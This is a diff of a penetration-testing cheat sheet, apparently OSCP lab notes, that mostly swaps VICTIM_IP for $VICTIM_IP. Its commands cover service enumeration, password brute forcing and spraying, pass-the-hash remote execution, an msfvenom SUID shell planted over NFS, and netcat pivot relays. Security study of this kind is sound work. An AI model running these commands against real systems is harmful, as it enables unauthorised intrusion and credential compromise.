@@ -158,8 +158,8 @@ mkdir -p scans/nmap; cd scans; nmap -v -n -A -oA nmap/initial-scan $VICTIM_IP
 ports=$(nmap -v -n -T4 --min-rate=1000 -p- --open --reason $VICTIM_IP | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
 nmap -n -v -sC -sV -p $ports -oA nmap/tcp-all $VICTIM_IP
 
-# top 20 UDP ports
-sudo nmap -n -v -sU --top-ports=20 --reason -oA nmap/udp-top20 -T4 $VICTIM_IP
+# top 50 UDP ports
+sudo nmap -n -v -sU --top-ports=50 --reason -oA nmap/udp-top50 -T4 $VICTIM_IP
 
 # specifying safe and wildcard ftp-* scripts
 # logic: and, or, not all work. "," is like "or"
@@ -212,24 +212,24 @@ echo "Done"
 
 ```sh
 # Banner grab, command/user enum
-nc -nvC VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
-telnet VICTIM_IP 25  # alternate method, does \r\n by default
+nc -nvC $VICTIM_IP 25  # "-C" forces sending \r\n line ending, required by smtp
+telnet $VICTIM_IP 25  # alternate method, does \r\n by default
 # SMTPS
-openssl s_client -crlf -connect VICTIM_IP:465 #SSL/TLS without starttls command
-openssl s_client -starttls smtp -crlf -connect VICTIM_IP:587
+openssl s_client -crlf -connect $VICTIM_IP:465 #SSL/TLS without starttls command
+openssl s_client -starttls smtp -crlf -connect $VICTIM_IP:587
 
 # on telnet/nc connection, try enumerating users manually via:
 EXPN  # get mailing list
 VRFY root  # check if you can use VRFY to enumerate users
 
 # basic enumeration
-nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp VICTIM_IP
+nmap -n -v -p25 --script="smtp-* and safe" -oA nmap/smtp $VICTIM_IP
 
 # enumerate users
-nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users VICTIM_IP
+nmap -n -v -p25 --script="smtp-enum-users" -oA nmap/smtp-users $VICTIM_IP
 # smtp-user-enum lets you check specific usernames, add a domain, and
 # specify the mode (EXPN, VRFY, RCPT) for validation
-smtp-user-enum -M MODE -U users.txt -D DOMAIN -t VICTIM_IP
+smtp-user-enum -M MODE -U users.txt -D DOMAIN -t $VICTIM_IP
 ```
 
 Other ideas:
@@ -315,7 +315,7 @@ Always check:
 Whatweb shows more details about tech stacks in use by server.
 
 ```sh
-whatweb -v -a3 VICTIM_IP
+whatweb -v -a3 $VICTIM_IP
 ```
 
 **PHP 5.x is vulnerable to Shellshock!**
@@ -328,6 +328,11 @@ gobuster dir -eku http://$VICTIM_IP:8080 -w /usr/share/dirb/wordlists/common.txt
 # user-agent:
 # -a 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3831.6 Safari/537.36'
 # other good common list: /usr/share/seclists/Discovery/Web-Content/common.txt
+
+# FFUF through a SOCKS proxy
+ffuf -o ffuf.json -recursion -recursion-depth 2 -x socks5://localhost:1080 -u http://$VICTIM_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+# pretty print json output:
+ffuf.json | python -m json.tool
 ```
 
 ### 3.7.3. Common Web Vuln scanning with Nikto
@@ -368,19 +373,19 @@ Post Office Protocol (POP) retrieves email from a remote mail server.
 
 ```sh
 # banner grabbing
-nc -nvC VICTIM_IP 110
-openssl s_client -connect VICTIM_IP:995 -crlf -quiet
+nc -nvC $VICTIM_IP 110
+openssl s_client -connect $VICTIM_IP:995 -crlf -quiet
 
 # basic scan
-nmap -n -v -p110 --script="pop3-* and safe" -oA nmap/pop3 VICTIM_IP
+nmap -n -v -p110 -sV --script="pop3-* and safe" -oA nmap/pop3 $VICTIM_IP
 
 # Bruteforcing
-hydra -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f VICTIM_IP pop3
-hydra -S -l USERNAME -P /path/to/passwords.txt -s 995 -f VICTIM_IP pop3
+hydra -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f $VICTIM_IP pop3
+hydra -S -l USERNAME -P /path/to/passwords.txt -s 995 -f $VICTIM_IP pop3
 
 # user enum / log in
-nc -nvC VICTIM_IP 110  # "-C" for \r\n line endings, required
-telnet VICTIM_IP 110   # alternate method
+nc -nvC $VICTIM_IP 110  # "-C" for \r\n line endings, required
+telnet $VICTIM_IP 110   # alternate method
 USER username
 PASS password
 LIST # gets list of emails and sizes
@@ -395,12 +400,12 @@ or rusersd services to pentest next.
 
 ```sh
 # banner grab
-nc -nv VICTIM_IP 111
+nc -nv $VICTIM_IP 111
 
 # list short summary of rpc services
-rpcinfo -s VICTIM_IP
+rpcinfo -s $VICTIM_IP
 # list ports of rpc services
-rpcinfo -p VICTIM_IP
+rpcinfo -p $VICTIM_IP
 ```
 
 ## 3.11. 119 - NNTP Enumeration
@@ -410,7 +415,7 @@ Network News Transfer Protocol, allows clients to retrieve (read) and post
 
 ```sh
 # banner grab, interact/view articles
-nc -nvC VICTIM_IP 119   # "-C" required for \r\n line endings
+nc -nvC $VICTIM_IP 119   # "-C" required for \r\n line endings
 HELP  # list help on commands (not always available)
 LIST  # list newsgroups, with 1st and last article numbers in each group
 GROUP newsgroup.name  # select the desired newsgroup to access (e.g. "net.news")
@@ -472,10 +477,10 @@ nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
 
 ```sh
 # List shares without creds
-smbclient -N -L VICTIM_IP
+smbclient -N -L $VICTIM_IP
 
 # enumerate shares you have creds for (or ones that don't require creds)
-smbclient -L VICTIM_IP -W DOMAIN -U svc-admin
+smbclient -L $VICTIM_IP -W DOMAIN -U svc-admin
 ```
 
 ### 3.13.2. Interacting on SMB
@@ -510,10 +515,10 @@ More great tips on [HackTricks](https://book.hacktricks.xyz/pentesting/pentestin
 
 ```sh
 # Log in using service account creds if able
-sqsh -S VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
+sqsh -S $VICTIM_IP -U 'DOMAIN\USERNAME' -P PASSWORD [-D DATABASE]
 
 # probably a simpler tool:
-impacket-mssqlclient DOMAIN/USERNAME@VICTIM_IP -windows-auth
+impacket-mssqlclient DOMAIN/USERNAME@$VICTIM_IP -windows-auth
 # requires double quotes for xp_cmdshell strings
 ```
 
@@ -545,19 +550,19 @@ go
 
 ```sh
 # scan with scripts
-nmap -n -v -p 2049 --script="safe and nfs-*" -oA nmap/nfs-scripts VICTIM_IP
+nmap -n -v -p 2049 --script="safe and nfs-*" -oA nmap/nfs-scripts $VICTIM_IP
 
 # list all mountpoints
-showmount -a VICTIM_IP
+showmount -a $VICTIM_IP
 # list all directories
-showmount -d VICTIM_IP
+showmount -d $VICTIM_IP
 # list all exports (remote folders you can mount)
-showmount -e VICTIM_IP
+showmount -e $VICTIM_IP
 
 # mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
 # use version 2 because it doesn't have any authentication or authorization
 # dir may need "/"prefix
-mkdir nfs && sudo mount -t nfs -o vers=2 -o nolock VICTIM_IP:DIR nfs
+mkdir nfs && sudo mount -t nfs -o vers=2 -o nolock $VICTIM_IP:DIR nfs
 
 # create user with specific UID to be able to read files on your kali box
 # "-s" login shell, "-M" no create home
@@ -738,16 +743,16 @@ are: 5800,5801,5900,5901
 
 ```sh
 # nmap scan
-nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 VICTIM_IP
+nmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP
 
 # connect ('-passwd passwd.txt' to use password file)
-vncviewer VICTIM_IP
+vncviewer $VICTIM_IP
 
 # bruteforcing
-hydra -L user.txt –P pass.txt -s PORT vnc://VICTIM_IP
-medusa -h VICTIM_IP –u root -P pass.txt –M vnc
-ncrack -V --user root -P pass.txt VICTIM_IP:PORT
-patator vnc_login host=VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
+hydra -L user.txt –P pass.txt -s PORT vnc://$VICTIM_IP
+medusa -h $VICTIM_IP –u root -P pass.txt –M vnc
+ncrack -V --user root -P pass.txt $VICTIM_IP:PORT
+patator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0use auxiliary/scanner/vnc/vnc_login
 ```
 # 4. Exploitation
 
@@ -832,17 +837,17 @@ rules.
 ```sh
 # Be carefull with the number of password in the list, this could lock-out accounts
 # Use the NetBIOS name of the machine as domain, if needed
-crackmapexec mssql VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
-hydra -L /path/to/usernames.txt –P /path/to/passwords.txt VICTIM_IP mssql
-medusa -h VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
-nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts VICTIM_IP
+crackmapexec mssql $VICTIM_IP -d DOMAINNAME -u usernames.txt -p passwords.txt
+hydra -L /path/to/usernames.txt –P /path/to/passwords.txt $VICTIM_IP mssql
+medusa -h $VICTIM_IP –U /path/to/usernames.txt –P /path/to/passwords.txt –M mssql
+nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=usernames.txt,passdb=passwords.txt,ms-sql-brute.brute-windows-accounts $VICTIM_IP
 ```
 
 ### 4.2.4. SMB Bruteforcing
 
 ```sh
-nmap --script smb-brute -p 445 VICTIM_IP
-hydra -l Administrator -P passwords.txt -t 1 VICTIM_IP smb
+nmap --script smb-brute -p 445 $VICTIM_IP
+hydra -l Administrator -P passwords.txt -t 1 $VICTIM_IP smb
 ```
 
 ### 4.2.5. SSH Bruteforcing
@@ -850,16 +855,16 @@ hydra -l Administrator -P passwords.txt -t 1 VICTIM_IP smb
 ```sh
 # using hydra
 # '-s PORT' contact service on non-default port
-hydra -l username -P wordlist.txt -s 2222 VICTIM_IP ssh
+hydra -l username -P wordlist.txt -s 2222 $VICTIM_IP ssh
 
 # spray creds to entire subnet to see if they work on other boxes, too!
 hydra -l username -p password -W 5 10.11.1.0/24 ssh
 
 # using patator: useful when services (e.g. ssh) are too old for hydra to work
-patator ssh_login host=VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+patator ssh_login host=$VICTIM_IP port=2222 persistent=0 -x ignore:fgrep='failed' user=username password=FILE0 0=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
 
-ncrack -p 22 --user root -P passwords.txt VICTIM_IP [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
+ncrack -p 22 --user root -P passwords.txt $VICTIM_IP [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h $VICTIM_IP -M ssh
 ```
 
 ### 4.2.6. Web Form (HTTP POST) Bruteforcing
@@ -871,7 +876,7 @@ medusa -u root -P 500-worst-passwords.txt -h VICTIM_IP -M ssh
 # '-P wordlist.txt' means iterate through all passwords in wordlist. '-p password123' uses only that one.
 # '-t 64': use 64 threads
 # change to https-web-form for port 443
-hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
+hydra -l admin -P ~/repos/SecLists/Passwords/Leaked-Databases/rockyou-50.txt $VICTIM_IP_OR_DOMAIN http-post-form "/blog/admin.php:username=^USER^&password=^PASS^:Incorrect username" -t 64
 ```
 
 ### 4.2.7. Zip File Password Cracking
@@ -891,11 +896,11 @@ john zipkey.john --wordlist=/usr/share/wordlists/rockyou.txt
 # port knock on ports 22->23->24 with nmap
 # "-r" forces ports to be hit in order
 # may want to add "--max-parallelism 1"
-nmap -Pn --host-timeout 201 --max-retries 0 -r -p22,23,24 VICTIM_IP
+nmap -Pn --host-timeout 201 --max-retries 0 -r -p22,23,24 $VICTIM_IP
 
 # doing the same thing with netcat
 # NOTE: netcat can only knock on sequential ports without using a for-loop
-nc -z VICTIM_IP 22-24
+nc -z $VICTIM_IP 22-24
 ```
 
 ## 4.4. Reverse Shells
@@ -1408,16 +1413,16 @@ Note: Windows hashes are in the form LMHASH:NTHASH. That convention is used here
 ```sh
 # Get remote powershell shell by passing the hash
 # install: sudo gem install evil-winrm
-evil-winrm.rb -i VICTIM_IP -u username -H NTHASH
+evil-winrm.rb -i $VICTIM_IP -u username -H NTHASH
 
 # Run remote command as SYSTEM (note colon before NT hash)
-impacket-psexec -hashes :NTHASH administrator@VICTIM_IP whoami
+impacket-psexec -hashes :NTHASH administrator@$VICTIM_IP whoami
 # omit the command to get interactive shell
 
-impacket-wmiexec DOMAIN/Administrator@VICTIM_IP -hashes LMHASH:NTHASH
+impacket-wmiexec DOMAIN/Administrator@$VICTIM_IP -hashes LMHASH:NTHASH
 
 # execute remote command as Admin (IP MUST GO LAST!)
-crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami VICTIM_IP
+crackmapexec smb -d DOMAIN -u Administrator -H LMHASH:NTHASH -x whoami $VICTIM_IP
 
 # spawn cmd.exe shell on remote windows box
 # replace 'admin' with username, 'hash' with full LM-NTLM hash (colon-separated)
@@ -1996,7 +2001,7 @@ cat /etc/exports
 # On Kali box:
 sudo su   # switch to root
 mkdir /tmp/nfs
-mount -o rw,vers=2 VICTIM_IP:/share_name /tmp/nfs
+mount -o rw,vers=2 $VICTIM_IP:/share_name /tmp/nfs
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 chmod +xs /tmp/nfs/shell.elf
 
@@ -2082,12 +2087,12 @@ sudo impacket-smbserver share .
 
 Using curl to upload file to windows SMB share
 ```sh
-curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://VICTIM_IP/c$/
+curl --upload-file /path/to/rsh.exe -u 'DOMAIN\username' smb://$VICTIM_IP/c$/
 ```
 
 Get all files from SMB share with `smbclient`:
 ```sh
-smbclient //VICTIM_IP/SHARENAME
+smbclient //$VICTIM_IP/SHARENAME
 > RECURSE ON
 > PROMPT OFF
 > mget *
@@ -2464,7 +2469,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 ## 8.4. Connect to Windows RDP
 
 ```sh
-xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:VICTIM_IP
+xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
 # to attach a drive, use:
 # /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
 ```
@@ -2515,11 +2520,11 @@ ssh tunneler@jumpbox_ip -p 2222 -gL 4445:internal_server_ip:445
 # Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
 # internal_server_ip, which is only reachable from jumpbox_ip
 
-# SSH local port forward to send traffic from our local port 4445 to victim's
-# port 445 (to get around firewall restrictions that don't allow remote
+# SSH local port forward to send traffic from our local port 8080 to victim's
+# port 80 (to get around firewall restrictions that don't allow remote
 # connections to that port, but allow us to ssh in)
-ssh victim@victim_ip -gL 8080:localhost:80
-# Now `curl localhost:8080` will fetch victim_ip:80 which is not reachable
+ssh victim@$VICTIM_IP -gL 8080:localhost:80
+# Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable
 # from the outside
 
 ## Remote Forwarding #################################
@@ -2672,7 +2677,7 @@ firewalls and set up a SOCKS proxy through your tunnel.
 :: enter temporary directory to store relay.bat
 cd c:\temp
 :: create relay.bat to connect to victim service
-echo nc VICTIM_IP VICTIM_PORT > relay.bat
+echo nc $VICTIM_IP VICTIM_PORT > relay.bat
 :: Set up pivot listener (-L is persistent listener)
 nc –L –p LISTEN_PORT –e relay.bat
 ```
@@ -2680,14 +2685,10 @@ nc –L –p LISTEN_PORT –e relay.bat
 ```sh
 # LINUX pivot
 mkfifo /tmp/backpipe
-nc –l –p LISTEN_PORT 0<backpipe | nc VICTIM_IP VICTIM_PORT | tee backpipe
+nc –l –p LISTEN_PORT 0<backpipe | nc $VICTIM_IP VICTIM_PORT | tee backpipe
 ```
 
 # 11. Miscellaneous
-Host *
-   StrictHostKeyChecking no
-   UserKnownHostsFile=/dev/null
-
 ## 11.1. Disable SSH Host Key Checking
 
 Put this at the top of your `~/.ssh/config` to disable it for all hosts:
@@ -2697,6 +2698,8 @@ Host *
    StrictHostKeyChecking no
    UserKnownHostsFile=/dev/null
 ```
+
+or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
 
 ## 11.2. Convert text to Windows UTF-16 format on Linux
 
